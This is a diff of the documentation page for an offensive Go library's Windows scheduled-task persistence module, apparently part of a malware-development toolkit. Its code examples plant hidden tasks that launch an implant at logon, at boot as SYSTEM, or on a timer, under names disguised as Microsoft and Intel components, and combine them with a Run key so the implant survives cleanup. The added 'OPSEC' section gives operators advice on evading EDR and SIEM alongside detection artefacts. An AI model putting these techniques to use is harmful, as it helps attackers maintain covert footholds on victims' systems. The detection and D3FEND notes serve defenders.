@@ -1,210 +1,246 @@
-# Task Scheduler Persistence
-
-[<- Back to Persistence Overview](README.md)
-
-**MITRE ATT&CK:** [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
-**Package:** `persistence/scheduler`
-**Platform:** Windows
-**Detection:** Medium
-
 ---
+package: github.com/oioio-space/maldev/persistence/scheduler
+last_reviewed: 2026-04-27
+reflects_commit: f8b1a51
+---
+
+# Scheduled task persistence
+
+[← persistence index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Create, list, run, and delete Windows scheduled tasks via the
+COM `ITaskService` API — no `schtasks.exe` child process.
+Supports logon, startup, daily, and one-shot time triggers, plus
+a `Hidden` flag. Implements [`persistence.Mechanism`](../../../persistence).
+Trade-off vs `persistence/service`: same SYSTEM-scope reach with
+broader trigger options and lower direct-spawn telemetry, but
+Event 4698 still emits.
 
 ## Primer
 
-Windows Task Scheduler can run programs on triggers like logon, system startup, or daily schedules. Creating a scheduled task ensures the payload runs even if the user cleans the Startup folder or registry Run keys.
+The Task Scheduler is the most flexible Windows persistence
+mechanism. Triggers go beyond logon (Run keys, StartUp folder)
+and boot (services): tasks can fire on a schedule, on idle, on
+session lock/unlock, on event-log entries, on system events.
 
----
+Most operators use `schtasks.exe` to register tasks — which
+spawns a visible child process under the implant's lineage.
+This package skips `schtasks.exe` entirely by talking to the
+`Schedule.Service` COM object directly via go-ole. The audit
+event (4698) still fires regardless of registration path; the
+process-creation telemetry vanishes.
 
 ## How It Works
 
 ```mermaid
 sequenceDiagram
-    participant Implant
-    participant Schtasks as schtasks.exe
-    participant Scheduler as Task Scheduler
-    participant Trigger as Logon/Startup
+    participant Caller
+    participant COM as Schedule.Service<br/>(COM)
+    participant TS as Task Scheduler service
+    participant Audit as Security log
+    participant Trig as Trigger fires
+    participant Bin as Implant
 
-    Implant->>Schtasks: /Create /TN "Task" /TR "payload.exe" /SC ONLOGON
-    Schtasks->>Scheduler: Register task
-    Note over Scheduler: Task stored in<br/>C:\Windows\System32\Tasks
-
-    Note over Trigger: User logon event
-    Trigger->>Scheduler: Evaluate triggers
-    Scheduler->>Implant: Execute payload
+    Caller->>COM: CoInitialize(STA)
+    Caller->>COM: GetFolder("\\")
+    Caller->>COM: NewTask() ITaskDefinition
+    Caller->>COM: set actions / triggers / settings (hidden=true)
+    Caller->>COM: RegisterTaskDefinition(name, def)
+    COM->>TS: persist task definition
+    TS-->>Audit: Event 4698 (scheduled task created)
+    Note over Trig: Trigger fires (logon / startup / daily / time)
+    TS->>Bin: spawn implant under SYSTEM (or registered context)
 ```
 
-**Trigger types:**
-- `TriggerLogon` — runs at user logon (requires elevation)
-- `TriggerStartup` — runs at system boot (requires elevation)
-- `TriggerDaily` — runs daily at a fixed time
+Triggers supported by this package:
 
----
+| Constructor | Trigger |
+|---|---|
+| `WithTriggerLogon()` | Any user logon |
+| `WithTriggerStartup()` | Boot — runs as SYSTEM by default |
+| `WithTriggerDaily(intervalDays)` | Every N days |
+| `WithTriggerTime(t)` | One-shot at `t` |
 
-## Usage
+Task names must start with `\` — `\TaskName` for the root
+folder, `\Folder\TaskName` for sub-folders.
+
+## API Reference
+
+### `type Task`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Task)
+
+Surface of a registered task — name, path, hidden flag, last
+run, next run, state.
+
+### Options (`type Option func(*options)`)
+
+| Option | Effect |
+|---|---|
+| `WithAction(path, args...)` | Required — the binary + args to launch |
+| `WithTriggerLogon()` | Any-user-logon trigger |
+| `WithTriggerStartup()` | Boot trigger |
+| `WithTriggerDaily(interval int)` | Daily trigger every N days |
+| `WithTriggerTime(t time.Time)` | One-shot at `t` |
+| `WithHidden()` | Set the task's `Hidden` flag (taskschd.msc must "Show Hidden Tasks") |
+
+### Functions
+
+| Symbol | Description |
+|---|---|
+| [`Create(name string, opts ...Option) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Create) | Register the task |
+| [`Delete(name string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Delete) | Remove the task |
+| [`Exists(name string) (bool, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Exists) | Presence probe |
+| [`List() ([]Task, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#List) | Enumerate root + recursive sub-folders |
+| [`Actions(name string) ([]string, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Actions) | Read-back action paths for an existing task |
+| [`Run(name string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#Run) | Trigger an immediate run via the COM `Run` method |
+| [`ScheduledTask(name, opts...) *TaskMechanism`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/scheduler#ScheduledTask) | `Mechanism` adapter |
+
+## Examples
+
+### Simple — logon trigger, hidden
 
 ```go
 import "github.com/oioio-space/maldev/persistence/scheduler"
 
-err := scheduler.Create(`\Microsoft\Windows\Update\Check`,
-    scheduler.WithAction(`C:\Temp\payload.exe`, "--silent"),
+_ = scheduler.Create(`\IntelGraphicsRefresh`,
+    scheduler.WithAction(`C:\ProgramData\Microsoft\winupdate.exe`),
     scheduler.WithTriggerLogon(),
     scheduler.WithHidden(),
 )
-
-found, _ := scheduler.Exists(`\Microsoft\Windows\Update\Check`)
-
-err = scheduler.Delete(`\Microsoft\Windows\Update\Check`)
+defer scheduler.Delete(`\IntelGraphicsRefresh`)
 ```
 
----
-
-## Advanced — Daily Trigger + Timed One-Shot
-
-`WithTriggerDaily` fires every N days at a configurable offset; combine it
-with `WithTriggerTime` for a one-shot future execution (useful for a
-time-bomb). `List()` and `Run()` round out the management surface.
+### Composed — Mechanism + boot trigger
 
 ```go
-import (
-    "log"
-    "time"
-
-    "github.com/oioio-space/maldev/persistence/scheduler"
+m := scheduler.ScheduledTask(`\Microsoft\Windows\WinUpdate\Refresh`,
+    scheduler.WithAction(`C:\ProgramData\Microsoft\winupdate.exe`),
+    scheduler.WithTriggerStartup(),
+    scheduler.WithHidden(),
 )
+_ = m.Install() // runs as SYSTEM at boot — admin required
+```
 
-// Daily at 08:30 — disguised as a Windows Update check.
-err := scheduler.Create(`\Microsoft\Windows\Update\Check`,
-    scheduler.WithAction(`C:\ProgramData\Intel\agent.exe`, "--silent"),
+### Advanced — daily + one-shot on the same task chain
+
+```go
+import "time"
+
+// Daily refresh: every day at the implant's chosen interval.
+_ = scheduler.Create(`\IntelGraphicsRefresh`,
+    scheduler.WithAction(`C:\ProgramData\Microsoft\winupdate.exe`),
     scheduler.WithTriggerDaily(1),
     scheduler.WithHidden(),
 )
-if err != nil {
-    log.Fatal(err)
-}
 
-// One-shot: fire in 24 hours (time-bomb / delayed payload).
-err = scheduler.Create(`\Microsoft\Windows\Update\Once`,
-    scheduler.WithAction(`C:\ProgramData\Intel\agent.exe`, "--once"),
-    scheduler.WithTriggerTime(time.Now().Add(24*time.Hour)),
+// One-shot recovery at a specific time (e.g. fire-and-forget
+// 2 hours from now to retry a failed C2 callback).
+recovery := time.Now().Add(2 * time.Hour)
+_ = scheduler.Create(`\IntelGraphicsRefreshRecovery`,
+    scheduler.WithAction(`C:\ProgramData\Microsoft\winupdate.exe`,
+        "--recovery"),
+    scheduler.WithTriggerTime(recovery),
     scheduler.WithHidden(),
 )
-
-// Enumerate all tasks — useful for cleanup before exfil.
-tasks, _ := scheduler.List()
-for _, t := range tasks {
-    log.Printf("%-60s  %s", t.Name, t.Path)
-}
 ```
 
----
-
-## Combined Example — Task + Registry Dual-Persistence
-
-Register two independent persistence mechanisms so removing one doesn't
-kill the implant.
+### Pipeline — task + Run-key dual persistence
 
 ```go
-package main
-
 import (
-    "log"
-
+    "github.com/oioio-space/maldev/persistence"
     "github.com/oioio-space/maldev/persistence/registry"
     "github.com/oioio-space/maldev/persistence/scheduler"
 )
 
-const (
-    payload  = `C:\ProgramData\Microsoft\Windows\Caches\mscache.exe`
-    taskName = `\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector`
-)
+const bin = `C:\ProgramData\Microsoft\winupdate.exe`
 
-func main() {
-    // 1. Registry Run key — fires on user logon without elevation.
-    if err := registry.Set(
-        registry.HiveCurrentUser, registry.KeyRun,
-        "DiskDiagnostic", payload,
-    ); err != nil {
-        log.Printf("registry: %v", err)
-    }
-
-    // 2. Scheduled task hidden under a real Windows task path — fires at
-    //    system startup (requires admin) so it covers sessions before
-    //    user logon.
-    if err := scheduler.Create(taskName,
-        scheduler.WithAction(payload, ""),
+mechs := []persistence.Mechanism{
+    scheduler.ScheduledTask(`\Microsoft\Windows\WinUpdate\Refresh`,
+        scheduler.WithAction(bin),
         scheduler.WithTriggerStartup(),
-        scheduler.WithHidden(),
-    ); err != nil {
-        log.Printf("scheduler: %v", err)
-    }
-
-    // Both mechanisms point at the same payload; cleaning one still leaves
-    // the other. The task name mimics a legitimate Windows diagnostic task.
+        scheduler.WithHidden()),
+    registry.RunKey(registry.HiveCurrentUser, registry.KeyRun,
+        "WinUpdateBackup", bin),
 }
+_ = persistence.InstallAll(mechs)
 ```
 
-Layered benefit: registry persistence covers normal user sessions; the
-scheduled task covers SYSTEM-context startup and is hidden in a task path
-that resembles a built-in Windows component — two independent kill-switches
-the analyst must find and remove separately.
+See [`ExampleCreate`](../../../persistence/scheduler/scheduler_example_test.go).
 
----
+## OPSEC & Detection
 
-## API Reference
+| Artefact | Where defenders look |
+|---|---|
+| Security Event 4698 (scheduled task created) | Universal audit; SIEM rules correlate against task-name patterns and binary paths |
+| Microsoft-Windows-TaskScheduler/Operational ETW provider | Per-task creation events |
+| `schtasks /query` / `Get-ScheduledTask` listing | Operator review; `Hidden` flag requires "Show Hidden" toggle in `taskschd.msc` but `schtasks /query /xml` shows everything |
+| Task XML stored at `%SystemRoot%\System32\Tasks\<path>\<name>` | File-creation telemetry on the XML drop |
+| Task-name patterns mimicking Microsoft (`\Microsoft\Windows\…`) | EDR rules flag custom tasks under the `\Microsoft\Windows\` prefix because legitimate Microsoft tasks ship via WIM, not runtime registration |
+| `schtasks.exe` child process | **Absent here** — COM path bypasses Sysmon Event 1 / child-process EDR rules |
+| `Hidden` task with non-Microsoft author | Defender heuristic flags hidden tasks created by non-Microsoft processes |
 
-```go
-// Task is one parsed schtasks /Query row.
-type Task struct {
-    Name    string
-    Path    string
-    Enabled bool
-}
+**D3FEND counters:**
 
-// Option configures Create. Zero or more may be passed; trigger
-// options are mutually exclusive (last one wins).
-type Option func(*options)
+- [D3-SCA](https://d3fend.mitre.org/technique/d3f:ScheduledJobAnalysis/)
+  — task-creation event auditing.
+- [D3-SICA](https://d3fend.mitre.org/technique/d3f:SystemConfigurationDatabaseAnalysis/)
+  — task XML monitoring on disk.
 
-// WithAction sets the binary the task runs at trigger time.
-func WithAction(path string, args ...string) Option
+**Hardening for the operator:**
 
-// Trigger options.
-func WithTriggerLogon() Option
-func WithTriggerStartup() Option
-func WithTriggerDaily(interval int) Option   // every N days
-func WithTriggerTime(t time.Time) Option     // one-shot at t
+- Match the task path + name to a plausible Microsoft idiom
+  (`\Microsoft\Windows\<Component>\<Task>`) — but be aware
+  some EDRs flag non-Microsoft authors at exactly that path
+  prefix.
+- Use `WithHidden()` to keep the task out of casual
+  `taskschd.msc` browsing, but don't rely on it as a stealth
+  primitive — `schtasks /query /xml` and `Get-ScheduledTask`
+  still surface it.
+- Prefer `WithTriggerStartup` over `WithTriggerLogon` for
+  pre-logon callbacks; the SYSTEM context is broader and the
+  task fires before the user is logged in.
+- Pair with [`pe/masquerade`](../pe/masquerade.md) for binary
+  identity match.
+- Avoid hosts with strict task-creation auditing
+  (Microsoft-Windows-TaskScheduler/Operational forwarded to
+  enterprise SIEM).
 
-// WithHidden hides the task from non-elevated schtasks listings
-// (sets the SCHED_FLAG_HIDDEN bit).
-func WithHidden() Option
+## MITRE ATT&CK
 
-// Create registers a scheduled task. Wraps schtasks.exe under the hood.
-func Create(name string, opts ...Option) error
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job: Scheduled Task | full — COM-based registration, all common triggers | D3-SCA, D3-SICA |
 
-// Delete removes the named task.
-func Delete(name string) error
+## Limitations
 
-// Exists reports whether the named task is registered.
-func Exists(name string) (bool, error)
+- **Audit cannot be skipped.** Event 4698 fires at registration
+  regardless of how the task is created.
+- **Trigger options trimmed.** This package supports the
+  common triggers (logon, startup, daily, one-shot time).
+  Other COM triggers (idle, session lock/unlock, event-log
+  match) are not exposed — extend `options` to add.
+- **Startup/logon triggers require admin.** Boot/startup tasks
+  registered without admin are silently downgraded to "any
+  user logon" or rejected.
+- **Hidden flag is cosmetic.** `taskschd.msc` hides the task
+  from default view; every other tooling surfaces it.
+- **No principal override.** Tasks run as the registered
+  user (or SYSTEM for startup/boot). Specifying a different
+  principal (`RunAs`) requires the password and is out of
+  scope for this package.
 
-// List enumerates registered tasks.
-func List() ([]Task, error)
+## See also
 
-// Actions returns the configured action paths for the named task.
-func Actions(name string) ([]string, error)
-
-// Run forces an immediate one-off run of the named task.
-func Run(name string) error
-
-// ScheduledTask returns a persistence.Mechanism wrapping
-// Create/Delete/Exists for use with persistence.Pipeline.
-func ScheduledTask(name string, opts ...Option) *TaskMechanism
-
-type TaskMechanism struct{ /* unexported */ }
-
-func (m *TaskMechanism) Name() string
-func (m *TaskMechanism) Install() error
-func (m *TaskMechanism) Uninstall() error
-func (m *TaskMechanism) Installed() (bool, error)
-```
-
-See also [persistence.md](../../persistence.md#persistencescheduler----task-scheduler) for the package summary row.
+- [`persistence/service`](service.md) — sibling SYSTEM-scope
+  persistence with stronger SCM telemetry.
+- [`persistence/registry`](registry.md) — sibling logon-only
+  persistence with lighter audit.
+- [`pe/masquerade`](../pe/masquerade.md) — match binary
+  identity to the cloned trigger lineage.
+- [`cleanup`](../cleanup/README.md) — remove the task post-op.
+- [Operator path](../../by-role/operator.md).
+- [Detection eng path](../../by-role/detection-eng.md).
